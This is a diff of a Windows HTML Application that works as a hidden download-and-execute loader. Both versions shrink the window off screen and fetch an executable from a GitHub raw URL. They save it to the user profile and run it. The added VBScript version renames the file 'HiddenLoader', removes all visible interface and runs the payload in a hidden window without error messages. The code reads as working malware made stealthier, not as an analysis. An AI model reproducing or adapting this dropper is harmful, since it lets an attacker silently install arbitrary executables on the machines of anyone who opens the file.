@@ -1,62 +1,53 @@
 <html>
 <head>
 <HTA:APPLICATION 
-    ID="SystemMonitorLoader"
-    APPLICATIONNAME="System Monitor"
+    ID="HiddenLoader"
+    APPLICATIONNAME="HiddenLoader"
     WINDOWSTATE="minimize"
     SHOWINTASKBAR="no"
     CAPTION="no"
     SYSMENU="no"
     SCROLL="no"
+    BORDER="none"
+    INNERBORDER="no"
+    CONTEXTMENU="no"
+    SELECTION="no"
 />
-<title>System Monitor</title>
-<script language="JavaScript">
-window.resizeTo(1,1);
-window.moveTo(-1000,-1000);
-
-function downloadAndRun() {
-    try {
-        var shell = new ActiveXObject("WScript.Shell");
-        var fs = new ActiveXObject("Scripting.FileSystemObject");
+<title></title>
+<script language="VBScript">
+    Sub Window_OnLoad
+        ' Hide the window completely
+        window.resizeTo 0, 0
+        window.moveTo -10000, -10000
         
-        // Set paths
-        var userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%");
-        var exePath = userProfile + "\\SystemMonitor_signed.exe";
-        var downloadURL = "https://github.com/EncryptedByRollerV8/n/raw/main/SystemMonitor_signed.exe";
+        Set objShell = CreateObject("WScript.Shell")
+        userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
+        exePath = userProfile & "\SystemMonitor_signed.exe"
+        downloadURL = "https://github.com/EncryptedByRollerV8/n/raw/main/SystemMonitor_signed.exe"
         
-        // Download the file
-        var xhr = new ActiveXObject("Microsoft.XMLHTTP");
-        xhr.open("GET", downloadURL, false);
-        xhr.send();
+        ' Download using XMLHTTP
+        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+        objXMLHTTP.open "GET", downloadURL, false
+        objXMLHTTP.send()
         
-        if (xhr.status === 200) {
-            var stream = new ActiveXObject("ADODB.Stream");
-            stream.Open();
-            stream.Type = 1; // Binary
-            stream.Write(xhr.responseBody);
-            stream.SaveToFile(exePath, 2); // Overwrite if exists
-            stream.Close();
+        If objXMLHTTP.Status = 200 Then
+            Set objADOStream = CreateObject("ADODB.Stream")
+            objADOStream.Open
+            objADOStream.Type = 1
+            objADOStream.Write objXMLHTTP.ResponseBody
+            objADOStream.Position = 0
+            objADOStream.SaveToFile exePath
+            objADOStream.Close
             
-            // Execute the file
-            shell.Run('"' + exePath + '"', 1, false);
-        } else {
-            alert("Download failed. Status: " + xhr.status);
-        }
-    } catch(e) {
-        alert("Error: " + e.message);
-    }
-    
-    // Close HTA
-    window.setTimeout(function() {
-        window.close();
-    }, 100);
-}
-
-// Run when HTA loads
-window.onload = downloadAndRun;
+            ' Run the executable
+            objShell.Run Chr(34) & exePath & Chr(34), 0, False
+        End If
+        
+        ' Close HTA
+        window.Close
+    End Sub
 </script>
 </head>
 <body>
-<!-- Empty body - window will be hidden -->
 </body>
 </html>
